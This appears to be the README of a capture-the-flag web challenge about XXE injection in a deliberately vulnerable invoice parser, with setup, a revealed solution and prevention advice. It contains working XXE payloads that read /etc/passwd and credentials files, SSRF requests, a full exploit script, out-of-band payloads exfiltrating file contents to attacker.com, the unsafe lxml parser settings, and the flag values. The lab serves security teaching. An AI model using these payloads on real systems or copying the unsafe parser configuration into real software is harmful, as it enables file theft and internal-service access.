# XXE Injection Challenge

**Status:** ✅ Complete

## Player Description

Upload your invoices to EverSec's Automated Invoice Parser! We use XML because it's the future (we haven't checked what year it is lately). To provide the best user experience, we enabled EVERY SINGLE FEATURE in the XML parser - why have features if you're not going to use them? External entities? Sure! DTD processing? Absolutely! Network access? Why not! Our developer documentation said these features could be "potentially dangerous" but we think documentation is just being dramatic. After all, who would put malicious content in an XML file? That's just silly! 📄✨

## Technical Description

**Category:** Web / XML Injection
**Difficulty:** Medium-Hard
**Points:** 250

An invoice processing system that parses XML files and is vulnerable to XML External Entity (XXE) injection. This challenge demonstrates how improper XML parsing configuration can allow attackers to read arbitrary files, perform SSRF attacks, and potentially achieve remote code execution.

## Challenge Information

- **Port:** 4005
- **URL:** http://localhost:4005

## Objective

Exploit XML External Entity (XXE) vulnerabilities to:
1. **FLAG 1**: Successfully inject and process an external entity
2. **FLAG 2**: Read sensitive files from the server filesystem
3. **FLAG 3**: Perform Server-Side Request Forgery (SSRF) to access internal services

## Background: What is XXE?

XML External Entity (XXE) injection is a vulnerability that occurs when an XML parser processes external entity references within XML documents. XML supports defining entities (similar to variables) in the Document Type Definition (DTD). External entities can reference:
- Local files (`file:///etc/passwd`)
- Remote URLs (`http://attacker.com/evil.dtd`)
- Internal services (`http://localhost:8080/admin`)

When XML parsers have external entity processing enabled, attackers can exploit this to:
- Read arbitrary files
- Perform SSRF attacks
- Cause denial of service
- Execute code (in rare cases)

## The Vulnerability

### 1. Unsafe XML Parsing (app.py)

```python
# VULNERABLE: lxml with resolve_entities=True and no_network=False
parser = etree.XMLParser(resolve_entities=True, no_network=False)
root = etree.fromstring(xml_content.encode(), parser=parser)
```

The application uses lxml's XMLParser with dangerous settings:
- `resolve_entities=True`: Enables processing of external entities
- `no_network=False`: Allows network access for external entities

### 2. File Upload Endpoint (/upload)

The `/upload` endpoint accepts XML invoice files and parses them without restricting external entities, allowing XXE exploitation.

### 3. API Endpoint (/api/parse)

The `/api/parse` endpoint accepts raw XML in the POST body, making it even easier to exploit.

## Setup

### Using Docker Compose (Recommended)

From the project root directory:

```bash
docker compose up -d xxe-injection
```

The challenge will be available at http://localhost:4005

### Using Docker Directly

From this directory:

```bash
docker build -t xxe-injection .
docker run -p 4005:4005 \
  -e FLAG1="FLAG{xxe_d1sc0v3r3d}" \
  -e FLAG2="FLAG{f1l3_r34d_succ3ss}" \
  -e FLAG3="FLAG{ssrf_t0_1nt3rn4l}" \
  xxe-injection
```

### Local Development

```bash
pip install -r requirements.txt
export FLAG1="FLAG{xxe_d1sc0v3r3d}"
export FLAG2="FLAG{f1l3_r34d_succ3ss}"
export FLAG3="FLAG{ssrf_t0_1nt3rn4l}"
python app.py
```

## Solution

<details>
<summary>Click to reveal solution</summary>

### Phase 1: FLAG 1 - Basic XXE Detection

#### Step 1: Understand the Invoice Format

Visit http://localhost:4005/example to see the expected XML format:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<invoice>
    <number>INV-2026-001</number>
    <date>2026-01-19</date>
    <customer>Acme Corporation</customer>
    <amount>1500.00</amount>
    <items>
        <item>
            <description>Security Audit</description>
            <price>1000.00</price>
        </item>
    </items>
</invoice>
```

#### Step 2: Test Basic XXE

Create a malicious XML file with an external entity:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe "XXE_INJECTION_WORKS">
]>
<invoice>
    <number>&xxe;</number>
    <date>2026-01-19</date>
    <customer>Test Customer</customer>
    <amount>100.00</amount>
</invoice>
```

Upload this file via the web interface at http://localhost:4005/upload

If you see "XXE_INJECTION_WORKS" in the output, the XXE vulnerability is confirmed!

#### Step 2b: Discover Flag Locations

Before injecting, check `robots.txt` and the API docs for path hints:

```bash
curl http://localhost:4005/robots.txt
```

The `robots.txt` hints at sensitive directories including `/tmp/` and `/opt/eversec/`. You can also check:

```bash
curl http://localhost:4005/api/docs
```

The API docs endpoint also reveals storage path information used by the application.

#### Step 3: Get FLAG 1

FLAG 1 is at `/tmp/flags/flag1.txt`. Read it with XXE:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///tmp/flags/flag1.txt">
]>
<invoice>
    <number>&xxe;</number>
    <date>2026-01-19</date>
    <customer>Attacker</customer>
    <amount>0.00</amount>
</invoice>
```

The flag will appear in the invoice number field!

### Phase 2: FLAG 2 - File Disclosure

FLAG 2 is stored at `/opt/eversec/secrets/credentials.conf` as the value of `db_pass`. Read it to extract the flag:

#### Step 4: Read Arbitrary Files

Read sensitive system files:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<invoice>
    <number>INV-001</number>
    <date>2026-01-19</date>
    <customer>&xxe;</customer>
    <amount>100.00</amount>
</invoice>
```

#### Step 5: Get FLAG 2

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY flag2 SYSTEM "file:///opt/eversec/secrets/credentials.conf">
]>
<invoice>
    <number>INV-002</number>
    <date>2026-01-19</date>
    <customer>&flag2;</customer>
    <amount>200.00</amount>
</invoice>
```

The credentials file contains `db_pass=<flag>`. The flag value is the content after the `=` sign.

#### Step 6: Use API Endpoint (Easier)

```bash
curl -X POST http://localhost:4005/api/parse \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE invoice [<!ENTITY xxe SYSTEM "file:///tmp/flags/flag2.txt">]>
<invoice>
  <number>001</number>
  <date>2026-01-19</date>
  <customer>&xxe;</customer>
  <amount>100</amount>
</invoice>'
```

### Phase 3: FLAG 3 - SSRF Attack

#### Step 7: Access Internal Services

The application has an internal admin endpoint at `http://localhost:4005/admin/flag`

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY ssrf SYSTEM "http://localhost:4005/admin/flag">
]>
<invoice>
    <number>INV-003</number>
    <date>2026-01-19</date>
    <customer>&ssrf;</customer>
    <amount>300.00</amount>
</invoice>
```

The response from the internal endpoint (including FLAG 3) will appear in the customer field!

### Complete Exploit Script

```python
#!/usr/bin/env python3
import requests

BASE_URL = "http://localhost:4005"

print("=" * 60)
print("XXE Injection Exploit")
print("=" * 60)

# Phase 1: FLAG 1 - Basic XXE
print("\n[Phase 1] Basic XXE - FLAG 1")
print("-" * 60)

xxe_payload_flag1 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY flag1 SYSTEM "file:///tmp/flags/flag1.txt">
]>
<invoice>
  <number>&flag1;</number>
  <date>2026-01-19</date>
  <customer>Attacker</customer>
  <amount>100.00</amount>
</invoice>'''

response = requests.post(
    f"{BASE_URL}/api/parse",
    data=xxe_payload_flag1,
    headers={'Content-Type': 'application/xml'}
)

if response.status_code == 200:
    result = response.json()
    invoice_number = result.get('invoice', {}).get('number', '')
    if 'FLAG{' in invoice_number:
        print(f"🚩 FLAG 1: {invoice_number.strip()}")
    else:
        print(f"[+] Invoice number: {invoice_number}")

# Phase 2: FLAG 2 - File Disclosure
print("\n[Phase 2] File Disclosure - FLAG 2")
print("-" * 60)

xxe_payload_flag2 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY flag2 SYSTEM "file:///tmp/flags/flag2.txt">
]>
<invoice>
  <number>INV-002</number>
  <date>2026-01-19</date>
  <customer>&flag2;</customer>
  <amount>200.00</amount>
</invoice>'''

response = requests.post(
    f"{BASE_URL}/api/parse",
    data=xxe_payload_flag2,
    headers={'Content-Type': 'application/xml'}
)

if response.status_code == 200:
    result = response.json()
    customer = result.get('invoice', {}).get('customer', '')
    if 'FLAG{' in customer:
        print(f"🚩 FLAG 2: {customer.strip()}")
    else:
        print(f"[+] Customer field: {customer}")

# Phase 3: FLAG 3 - SSRF
print("\n[Phase 3] SSRF Attack - FLAG 3")
print("-" * 60)

xxe_payload_flag3 = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE invoice [
  <!ENTITY ssrf SYSTEM "http://localhost:4005/admin/flag">
]>
<invoice>
  <number>INV-003</number>
  <date>2026-01-19</date>
  <customer>&ssrf;</customer>
  <amount>300.00</amount>
</invoice>'''

response = requests.post(
    f"{BASE_URL}/api/parse",
    data=xxe_payload_flag3,
    headers={'Content-Type': 'application/xml'}
)

if response.status_code == 200:
    result = response.json()
    customer = result.get('invoice', {}).get('customer', '')

    # The response might be JSON stringified
    if 'flag' in customer.lower():
        import re
        flag_match = re.search(r'FLAG\{[^}]+\}', customer)
        if flag_match:
            print(f"🚩 FLAG 3: {flag_match.group(0)}")
        else:
            print(f"[+] SSRF Response: {customer}")

print("\n" + "=" * 60)
```

### Advanced XXE Techniques

#### Out-of-Band (OOB) XXE

When direct output is not available, use OOB exfiltration:

```xml
<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
  %send;
]>
<invoice>
  <number>001</number>
  <date>2026-01-19</date>
  <customer>Test</customer>
  <amount>100</amount>
</invoice>
```

evil.dtd on attacker server:
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

#### Blind XXE

When no output is returned:

```xml
<?xml version="1.0"?>
<!DOCTYPE invoice [
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
  %eval;
  %exfil;
]>
<invoice>
  <number>001</number>
</invoice>
```

</details>

## Learning Objectives

After completing this challenge, you should understand:

1. **XXE Fundamentals**: How XML external entities work
2. **DTD Syntax**: Understanding DOCTYPE declarations and entity definitions
3. **File Disclosure**: Reading arbitrary files through XXE
4. **SSRF via XXE**: Accessing internal services
5. **XXE Detection**: Identifying XXE vulnerabilities in applications
6. **Defense Techniques**: Properly configuring XML parsers

## Common Pitfalls

1. **Wrong XML syntax**: DTD declarations must be well-formed
2. **Entity not expanded**: Ensure the parser has external entity processing enabled
3. **Network restrictions**: Some environments block outbound connections
4. **File not found**: Verify file paths exist on the target system
5. **Encoding issues**: Special characters in files may break XML parsing

## Hints

> These hints are for CTF administrators helping stuck players. Share them progressively — start with Hint 1.

<details>
<summary>Hint 1</summary>

Check `/robots.txt` and the API documentation page for information about how the XML parser is configured and where files land on the server.

</details>

<details>
<summary>Hint 2</summary>

XML has a feature called external entity expansion. If a parser resolves external entities, what kinds of resources can an entity declaration reference — including files on the local server?

</details>

<details>
<summary>Hint 3</summary>

Once you can make the server read local files, consider what other services might be running on localhost. What might an internal-only service expose that isn't reachable from outside?

</details>

<details>
<summary>Hint 4</summary>

Further into the chain you gain code execution. What are the standard privilege escalation checks a pentester runs on a Linux system at this point?

</details>

## Prevention

### Disable External Entity Processing

```python
# SECURE: Disable external entities in lxml
from lxml import etree

parser = etree.XMLParser(
    resolve_entities=False,  # Disable entity resolution
    no_network=True,         # Disable network access
    dtd_validation=False,    # Disable DTD validation
    load_dtd=False          # Don't load DTD
)

root = etree.fromstring(xml_content, parser=parser)
```

### Use Safe XML Libraries

```python
# SECURE: Use defusedxml wrapper
import defusedxml.ElementTree as ET

# defusedxml disables dangerous features by default
root = ET.fromstring(xml_content)
```

### Input Validation

```python
# SECURE: Reject XML with DTD declarations
def validate_xml(xml_content):
    if '<!DOCTYPE' in xml_content or '<!ENTITY' in xml_content:
        raise ValueError("DTD declarations not allowed")
    return xml_content
```

### Use JSON Instead

```python
# SECURE: Use JSON instead of XML when possible
import json

data = json.loads(request.data)
# JSON has no entity or DTD concept
```

### General Best Practices

1. **Disable external entity processing** in all XML parsers
2. **Use defusedxml** or similar safe wrappers
3. **Prefer JSON** over XML when possible
4. **Validate and sanitize** XML input
5. **Implement allow lists** for acceptable XML schemas
6. **Disable DTD processing** entirely if not needed
7. **Use XML schemas** to validate structure
8. **Implement network restrictions** to prevent SSRF
9. **Regular security audits** of XML processing code
10. **Keep XML libraries updated**

## XML Parser Configuration Reference

```python
# Python xml.etree.ElementTree (safer by default in Python 3.8+)
import xml.etree.ElementTree as ET
ET.fromstring(xml)  # Generally safe in modern Python

# lxml (requires explicit hardening)
from lxml import etree
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)
etree.fromstring(xml, parser)

# defusedxml (recommended)
import defusedxml.ElementTree as ET
ET.fromstring(xml)  # Safe by default
```

## References

- [OWASP XXE](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [HackTricks XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
- [defusedxml Documentation](https://github.com/tiran/defusedxml)
- [XXE PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
